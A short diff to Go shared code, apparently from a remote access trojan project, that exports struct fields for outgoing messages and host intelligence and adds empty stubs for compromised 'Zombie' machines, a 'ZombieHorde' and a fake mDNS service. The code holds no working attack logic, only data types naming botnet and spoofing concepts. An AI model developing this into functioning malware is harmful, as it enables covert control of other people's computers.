@@ -5,7 +5,7 @@ each concept has its own faucets, traits, and actions
 
 /*/
 
-package rat_shared_code
+package Rat_shared_code
 
 import (
 	"crypto/cipher"
@@ -52,13 +52,13 @@ Contents of message are as follows:
 type OutgoingMessage struct {
 	// we can declare traits as any type we want
 
-	contents json.RawMessage
+	Contents json.RawMessage
 }
 
 // struct to hold intel about host
 type HostIntel struct {
-	interfaces          []net.Interface
-	network_information json.RawMessage
+	Interfaces          []net.Interface
+	Network_information json.RawMessage
 	OSInfo              json.RawMessage
 }
 
@@ -86,4 +86,16 @@ type StreamEncrypter struct {
 	Stream cipher.Stream
 	Mac    hash.Hash
 	IV     []byte
+}
+
+// we need objects to represent a compromised computer
+type Zombie struct {
+}
+
+// and a set of compromised computers
+type ZombieHorde struct {
+}
+
+// a "thing" to represent a fallacious MDNS service
+type FakeMDNSService struct {
 }
